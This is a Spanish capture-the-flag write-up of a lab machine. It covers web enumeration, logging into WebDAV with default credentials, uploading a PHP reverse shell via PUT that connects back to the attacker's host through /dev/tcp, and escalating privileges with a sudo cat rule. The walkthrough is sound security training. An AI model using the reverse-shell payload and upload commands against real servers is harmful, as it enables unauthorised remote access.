# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -Pn -n -sS -vvv $IP

PORT   STATE SERVICE
80/tcp open  http    syn-ack ttl 62
```

```bash
sudo nmap -p 80 -Pn -n -sVC -oN versiones.nmap $IP

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Vemos que tan solo está abierto el puerto 80 en el cuál corre un servicio ***Apache HTTP 2.4.18*** sobre una máquina ***Ubuntu***.

Cuando accedemos a la web se nos presenta el ***index.html*** que tare por defecto Apache para confirmar que el servicio está funcionando correctamente, por lo que suponemos que está recién instalado y sin mayores configuraciones.

Tras mirar el código fuente de la página vemos que no hay ningún comentario ni funcionalidad interesante, por lo que procedemos con la enumeración de *endpoints* y directorios web.
## `ffuf`

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-direcories.txt -u http://$IP/FUZZ -fc 404

webdav                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 39ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 39ms]
```

Encontramos un directorio interesante llamado ***webdav***.

>[!note]
>***WebDAV (Web Distribuited Authoring and Versioning)*** es una extensión del protocolo **HTTP** que permite a los usuarios editar y gestionar archivos de forma colaborativa en servidores remotos.

Cuando navegamos hacia él vemos que se nos presenta un pequeño formulario en el que debemos de introducir *usuario* y *contraseña*.

Si analizamos la petición realizada con *Burp Suite*, observamos que cuando introducimos las credenciales se realiza una petición `GET` usando un *header* `Authorization: Basic [code_base64]`.  Al decodificar el código en base 64 descubrí que era las credenciales que habia probado en el formato `usuario:contraseña`.

>[!important]
>Un error que cometí fue pensar: "*Como no tengo las credenciales, mi mejor baza es realizar un ataque de fuerza bruta*". Por lo que creé un script en *Python* que realiza este ataque. ***[Código en Python](./Brute_Force_Base64.py)***
>
>No obstante, no me daba resultado. Tras mucho tiempo de frustración probé a buscar en Internet las credenciales por defecto (`wampp:xampp`) y dio resultado.
>
>Aquí aprendí algo importante:
>"*No siempre hay que hacer las cosas de forma compleja. Al menos hay que probar lo sencillo antes.*"

Tras acceder al directorio `/webdav`, descubro un archivo `passwd.dav` el cual resulta contener las credenciales por defecto que hemos usado.

Sin embargo lo interesante no está en ese fichero que es el único que entramos, sino en el mismo directorio.

>[!note]
>La implementación de ***WebDAV*** presenta una configuración permisiva que permite el uso del método **`PUT`** para la carga de archivos arbitrarios.
>
>Aprovechando que el servidor cuenta con un motor de ejecución PHP activo en el directorio raíz de ***WebDAV***, se puede cargar un script malicioso (*Reverse Shell*) y forzar su ejecución mediante una petición **`GET`**. Esto resulta en una **Ejecución Remota de Código (RCE)**, permitiendo al atacante obtener una terminal interactiva bajo el contexto del usuario que corre el servicio web.
>
>Para ello:
>1. Creamos nuestro archivo malicioso
>   ```PHP
>   <?php exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1"');?>
>   ```
>2. Preparamos nuestra máquina para recibir al reverse shell.
>   ```bash
>   nc -lvnp 4444
>   ```
>3. Subimos nuestro fichero malicioso al servidor.
>   ```bash
>curl -v --user "wampp:xampp" http://$IP/webdav/ --upload-file reverse_shell.php -v
>
>PUT /webdav/reverse_shell.php HTTP/1.1
>Authorization: Basic d2FtcHA6eGFtcHA=
>
>HTTP/1.1 100 Continue
>We are completely uploaded and fine
>
>HTTP/1.1 201 Created
>   ```
>4. Realizamos una petición `GET` al fichero con la reverse shell.
>```bash
>curl --user "wampp:xampp" http://$IP/webdav/reverse_shell.php -v
>```
>- `-v`: Para depurar errores en caso de fallo.

---
# <font color=red>[+]</font> Post-Explotación

Tras obtener una reverse shell, lo siguiente que deberemos de hacer estabilizarla misma. Para ello creamos una nueva PTY, la configuramos y exportamos `xterm` para poder manejar mucho más cómodo la terminal.

```bash
script -c bash /dev/null

CTRL+Z

stty raw -echo ; fg
return

export TERM=xterm
export PS1="\u@\w>"
```

Una vez realizado estos pasos tendremos una PTY mucho más cómoda, permitiendo realizar comandos como lo haríamos normalmente, con autocompletado al usar la tecla `Tab` y lo más importante, pudiendo usar `CTRL+C` sin miedo a perder la conexión.
## Escalada de privilegios

Hemos obtenido acceso al sistema como el usuario `www-data`, el  cual al ser un usuario creado por un servicio carece de privilegios. Nuestra nueva misión es convertirnos en un usuario con mayores privilegios y repetir el proceso hasta conseguir ser el usuario `root`.

```bash
ls -la /home

drwxr-xr-x  4 merlin merlin 4096 Aug 25  2019 merlin
drwxr-xr-x  2 wampp  wampp  4096 Aug 25  2019 wampp
```

Vemos que existen dos directorios personales en `/home`, cuyos permisos nos permiten acceder a ellos. Dentro de `/home/merlin` obtenemos acceso al fichero `user.txt` el cual tenemos permisos para su lectura obteniendo la primera *flag*. Mas allá de eso, no encontramos nada de interés dentro de los directorios.
### `find`

Listamos los archivos del sistema que cuentan con el ***bit SUID activo***:
```bash
find / -perm /4000 2>/dev/null

/bin/ping6
/bin/mount
/bin/ping
/bin/umount
/bin/fusermount
/bin/su
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/vmware-user-suid-wrapper
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/gpasswd
```
Ninguno de estos ejecutables nos sirve para escalar privilegios.
### `sudo -l`

Podemos ejecutar el comando `sudo -l` sin necesidad de introducir la contraseña del usuario:
```bash
sudo -l

Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

Vemos que somos capaces de usar el binario `cat` con permisos de `root` usando `sudo` sin la necesidad de introducir la contraseña. Por lo que podremos obtener el contenido de `/root/root.txt`.
